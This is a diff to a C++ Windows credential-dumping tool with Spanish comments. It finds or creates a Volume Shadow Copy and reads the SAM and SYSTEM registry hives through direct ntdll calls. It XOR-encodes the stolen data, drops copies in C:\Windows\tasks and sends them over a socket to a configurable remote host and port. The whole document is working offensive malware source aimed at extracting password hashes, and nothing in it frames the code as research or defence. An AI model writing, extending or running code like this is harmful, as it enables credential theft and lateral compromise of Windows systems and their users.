@@ -16,6 +16,8 @@
 // #include <ws2tcpip.h>
 
 #define FILE_OPEN 0x00000001
+#define FILE_OVERWRITE_IF 0x00000005
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000010
 
 #pragma comment(lib, "vssapi.lib")
 #pragma comment(lib, "ws2_32.lib")
@@ -35,10 +37,22 @@ typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULO
 typedef NTSTATUS(WINAPI* NtCreateFileFn)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
 typedef NTSTATUS(WINAPI* NtReadFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);
+typedef NTSTATUS(WINAPI* NtWriteFileFn)(
+    HANDLE           FileHandle,
+    HANDLE           Event,
+    PVOID            ApcRoutine,
+    PVOID            ApcContext,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID            Buffer,
+    ULONG            Length,
+    PLARGE_INTEGER   ByteOffset,
+    PULONG           Key
+    );
 
 NtCreateFileFn NtCreateFile;
 NtReadFileFn NtReadFile;
 NtCloseFn NtClose;
+NtWriteFileFn NtWriteFile;
 
 
 bool send_file_over_socket(SOCKET sock, const std::string& filename, const std::vector<BYTE>& filedata) {
@@ -71,9 +85,7 @@ bool send_file_over_socket(SOCKET sock, const std::string& filename, const std::
 }
 
 
-bool send_files_to_netcat(const std::vector<BYTE>& sam_data,
-    const std::vector<BYTE>& system_data,
-    const char* host, int port) {
+bool send_files_remotely(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const char* host, int port) {
     // Inicializar Winsock
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -132,19 +144,17 @@ void PrintHR(const char* label, HRESULT hr) {
 }
 
 
-int list_shadows() {
-    std::cout << "=== DEPURACION VSS ENUM ===\n";
-
+BOOL list_shadows(std::wstring& outDeviceObject) {
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     PrintHR("CoInitializeEx", hr);
-    if (FAILED(hr)) return 1;
+    if (FAILED(hr)) return FALSE;
 
     IVssBackupComponents* pBackup = nullptr;
     hr = CreateVssBackupComponents(&pBackup);
     PrintHR("CreateVssBackupComponents", hr);
     if (FAILED(hr) || !pBackup) {
         CoUninitialize();
-        return 1;
+        return FALSE;
     }
 
     hr = pBackup->InitializeForBackup();
@@ -152,14 +162,12 @@ int list_shadows() {
     if (FAILED(hr)) {
         pBackup->Release();
         CoUninitialize();
-        return 1;
+        return FALSE;
     }
 
-    // *** CAMBIO CLAVE: Establecer el contexto para ver todas las shadow copies ***
     hr = pBackup->SetContext(VSS_CTX_ALL);
     PrintHR("SetContext", hr);
     if (FAILED(hr)) {
-        // Si falla, intentar con un contexto más específico
         hr = pBackup->SetContext(VSS_CTX_BACKUP);
         PrintHR("SetContext (BACKUP fallback)", hr);
     }
@@ -170,14 +178,12 @@ int list_shadows() {
     if (FAILED(hr) || !pEnum) {
         pBackup->Release();
         CoUninitialize();
-        return 1;
+        return FALSE;
     }
-
-    std::cout << "\nEnumerando instantaneas...\n";
 
     VSS_OBJECT_PROP prop = {};
     ULONG fetched = 0;
-    bool any = false;
+    BOOL found = FALSE;
 
     while (true) {
         hr = pEnum->Next(1, &prop, &fetched);
@@ -188,37 +194,23 @@ int list_shadows() {
         }
 
         if (prop.Type == VSS_OBJECT_SNAPSHOT) {
-            any = true;
             VSS_SNAPSHOT_PROP& snap = prop.Obj.Snap;
 
-            std::wcout << L"\nShadow ID:       " << GuidToWString(snap.m_SnapshotId);
-            std::wcout << L"\nSet ID:          " << GuidToWString(snap.m_SnapshotSetId);
-            std::wcout << L"\nOriginal Volume: " << (snap.m_pwszOriginalVolumeName ? snap.m_pwszOriginalVolumeName : L"(null)");
-            std::wcout << L"\nDevice Object:   " << (snap.m_pwszSnapshotDeviceObject ? snap.m_pwszSnapshotDeviceObject : L"(null)");
-            std::wcout << L"\nOriginating Machine: " << (snap.m_pwszOriginatingMachine ? snap.m_pwszOriginatingMachine : L"(null)");
-            std::wcout << L"\nService Machine:     " << (snap.m_pwszServiceMachine ? snap.m_pwszServiceMachine : L"(null)");
-
-            // Mostrar atributos en formato legible
-            std::wcout << L"\nAttributes:          0x" << std::hex << snap.m_lSnapshotAttributes << std::dec;
-            if (snap.m_lSnapshotAttributes & VSS_VOLSNAP_ATTR_PERSISTENT)
-                std::wcout << L" (Persistent)";
-            if (snap.m_lSnapshotAttributes & VSS_VOLSNAP_ATTR_CLIENT_ACCESSIBLE)
-                std::wcout << L" (Client-accessible)";
-            std::wcout << L"\n";
-
+            if (snap.m_pwszSnapshotDeviceObject) {
+                outDeviceObject = snap.m_pwszSnapshotDeviceObject;
+                found = TRUE;
+                VssFreeSnapshotProperties(&snap);
+                break; // Tomamos solo la primera que encontremos
+            }
             VssFreeSnapshotProperties(&snap);
         }
     }
-
-    if (!any)
-        std::cout << "\nNo se encontraron instantaneas.\n";
 
     pEnum->Release();
     pBackup->Release();
     CoUninitialize();
 
-    std::cout << "\n=== Fin del programa ===" << std::endl;
-    return 0;
+    return found;
 }
 
 
@@ -420,9 +412,10 @@ void InitializeNTFunctions() {
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     NtCreateFile = (NtCreateFileFn)GetProcAddress(hNtdll, "NtCreateFile");
     NtReadFile = (NtReadFileFn)GetProcAddress(hNtdll, "NtReadFile");
+    NtWriteFile = (NtWriteFileFn)GetProcAddress(hNtdll, "NtWriteFile");  // <-- Agregar esta línea
     NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");
 
-    if (!NtCreateFile || !NtReadFile || !NtClose) {
+    if (!NtCreateFile || !NtReadFile || !NtWriteFile || !NtClose) {
         printf("Error: No se pudieron cargar las funciones de ntdll.dll\n");
         exit(1);
     }
@@ -539,38 +532,193 @@ std::vector<BYTE> read_file(const wchar_t* filePath) {
 }
 
 
-int main() {
-    std::wstring basePath;
-    HRESULT hr = create_shadow(L"C:\\", basePath);
+BOOL WriteFileWithNT(const wchar_t* filePath, const std::vector<BYTE>& fileData) {
+    UNICODE_STRING unicodeString;
+    unicodeString.Buffer = (PWSTR)filePath;
+    unicodeString.Length = (USHORT)(wcslen(filePath) * sizeof(wchar_t));
+    unicodeString.MaximumLength = unicodeString.Length + sizeof(wchar_t);
 
-    if (!basePath.empty()) {
-        std::wcout << L"\nExito: Shadow copy creado! Device Object: " << basePath << std::endl;
+    OBJECT_ATTRIBUTES objectAttributes;
+    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
+    objectAttributes.RootDirectory = NULL;
+    objectAttributes.ObjectName = &unicodeString;
+    objectAttributes.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
+    objectAttributes.SecurityDescriptor = NULL;
+    objectAttributes.SecurityQualityOfService = NULL;
+
+    IO_STATUS_BLOCK ioStatusBlock;
+    HANDLE fileHandle = NULL;
+
+    // Crear/sobrescribir archivo con acceso de escritura
+    NTSTATUS status = NtCreateFile(
+        &fileHandle,
+        FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE,
+        &objectAttributes,
+        &ioStatusBlock,
+        NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        FILE_SHARE_READ,
+        FILE_OVERWRITE_IF,  // Sobrescribe si existe
+        FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL,
+        0
+    );
+
+    if (status != 0) {
+        printf("Error al crear archivo %ls. Código NT: 0x%08X\n", filePath, status);
+        return FALSE;
+    }
+
+    printf("Archivo creado: %ls\n", filePath);
+
+    // Escribir datos en el archivo
+    LARGE_INTEGER byteOffset = { 0 };
+    ULONG key = 0;
+
+    status = NtWriteFile(
+        fileHandle,
+        NULL,
+        NULL,
+        NULL,
+        &ioStatusBlock,
+        (PVOID)fileData.data(),
+        (ULONG)fileData.size(),
+        &byteOffset,
+        &key
+    );
+
+    if (status != 0) {
+        printf("Error escribiendo en archivo %ls. Código NT: 0x%08X\n", filePath, status);
+        NtClose(fileHandle);
+        return FALSE;
+    }
+
+    printf("Datos escritos: %zu bytes en %ls\n", fileData.size(), filePath);
+
+    // Cerrar handle
+    NtClose(fileHandle);
+    return TRUE;
+}
+
+
+BOOL SaveSamAndSystemFiles(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const std::wstring& basePath) {
+    printf("\n=== GUARDANDO ARCHIVOS SAM Y SYSTEM ===\n");
+
+    BOOL success = TRUE;
+
+    // Construir rutas completas
+    std::wstring samPath = L"\\??\\" + basePath + L"\\sam.txt";
+    std::wstring systemPath = L"\\??\\" + basePath + L"\\system.txt";
+
+    // Guardar archivo SAM
+    if (!WriteFileWithNT(samPath.c_str(), sam_data)) {
+        printf("Error guardando sam.txt\n");
+        success = FALSE;
     }
     else {
-        std::cout << "\nFallo: No se pudo crear shadow copy" << std::endl;
+        printf("sam.txt guardado exitosamente en %ls\n", samPath.c_str());
     }
 
-    size_t pos = basePath.find(L"\\\\?\\");
+    // Guardar archivo SYSTEM  
+    if (!WriteFileWithNT(systemPath.c_str(), system_data)) {
+        printf("Error guardando system.txt\n");
+        success = FALSE;
+    }
+    else {
+        printf("system.txt guardado exitosamente en %ls\n", systemPath.c_str());
+    }
+
+    return success;
+}
+
+
+std::vector<BYTE> encode_bytes(const std::vector<BYTE>& dump_bytes, const std::string& key_xor) {
+    std::vector<BYTE> encoded_bytes = dump_bytes;
+
+    if (key_xor.empty()) {
+        return encoded_bytes;
+    }
+
+    int key_len = key_xor.length();
+
+    for (size_t i = 0; i < encoded_bytes.size(); i++) {
+        encoded_bytes[i] = encoded_bytes[i] ^ key_xor[i % key_len];
+    }
+
+    return encoded_bytes;
+}
+
+
+int main() {
+    std::wstring output_dir     = L"C:\\Windows\\tasks";
+    std::wstring diskToShadow   = L"C:\\";
+    std::wstring samPath        = L"\\windows\\system32\\config\\sam";
+    std::wstring systemPath     = L"\\windows\\system32\\config\\system";
+    bool xorencode              = true;
+    std::string key_xor         = "SAMDump2025";
+    bool saveLocally            = true;
+    bool sendRemotely           = true;
+    const char* host            = "127.0.0.1";
+    int port                    = 7777;
+
+    // Get or create Shadow Copy's Device Object
+    std::wstring shadowCopyBasePath;
+    if (list_shadows(shadowCopyBasePath)) {
+        wprintf(L"Shadow copy encontrada: %s\n", shadowCopyBasePath.c_str());
+    }
+    else {
+        wprintf(L"No se encontraron shadow copies - Creando unaa\n");
+        HRESULT hr = create_shadow(diskToShadow, shadowCopyBasePath);
+
+        if (!shadowCopyBasePath.empty()) {
+            std::wcout << L"\nShadow copy created. Device Object: " << shadowCopyBasePath << std::endl;
+        }
+        else {
+            std::cout << "\nFailed to create a Shadow copy." << std::endl;
+        }
+    }
+
+    size_t pos = shadowCopyBasePath.find(L"\\\\?\\");
     if (pos != std::wstring::npos) {
-        basePath.replace(pos, 4, L"\\??\\");
+        shadowCopyBasePath.replace(pos, 4, L"\\??\\");
     }
 
-    std::wstring fullPathSam    = basePath + L"\\windows\\system32\\config\\sam";
-    std::wstring fullPathSystem = basePath + L"\\windows\\system32\\config\\system"; // L"\\temp\\test1.txt";
-
+    // Get bytes
+    std::wstring fullPathSam        = shadowCopyBasePath + samPath;
+    std::wstring fullPathSystem     = shadowCopyBasePath + systemPath;
     std::vector<BYTE> SamBytes      = read_file(fullPathSam.c_str());
     std::vector<BYTE> SystemBytes   = read_file(fullPathSystem.c_str());
-
-    if (send_files_to_netcat(SamBytes, SystemBytes, "127.0.0.1", 4444)) {
-        printf("Archivos enviados exitosamente\n");
+    printf("SAM: %zu bytes, SYSTEM: %zu bytes\n", SamBytes.size(), SystemBytes.size());
+    
+    // XOR-Encode
+    if (xorencode) {
+        std::vector<BYTE> encodedSamBytes = encode_bytes(SamBytes, key_xor);
+        std::vector<BYTE> encodedSystemBytes = encode_bytes(SystemBytes, key_xor);
+        printf("SAM original: %zu bytes, codificado: %zu bytes\n", SamBytes.size(), encodedSamBytes.size());
+        printf("SYSTEM original: %zu bytes, codificado: %zu bytes\n", SystemBytes.size(), encodedSystemBytes.size());
+        SamBytes = encodedSamBytes;
+        SystemBytes = encodedSystemBytes;
     }
-    else {
-        printf("Error enviando archivos\n");
+
+    // Save locally
+    if (saveLocally) {
+        if (SaveSamAndSystemFiles(SamBytes, SystemBytes, output_dir)) {
+            printf("\nArchivos guardados exitosamente en C:\\temp\\\n");
+        }
+        else {
+            printf("\nError guardando archivos\n");
+        }
     }
 
-    /*
-    list_shadows();
-    */
+    // Send remotely
+    if (sendRemotely) {
+        if (send_files_remotely(SamBytes, SystemBytes, host, port)) {
+            printf("Archivos enviados exitosamente\n");
+        }
+        else {
+            printf("Error enviando archivos\n");
+        }
+    }
 
     return 0;
 }
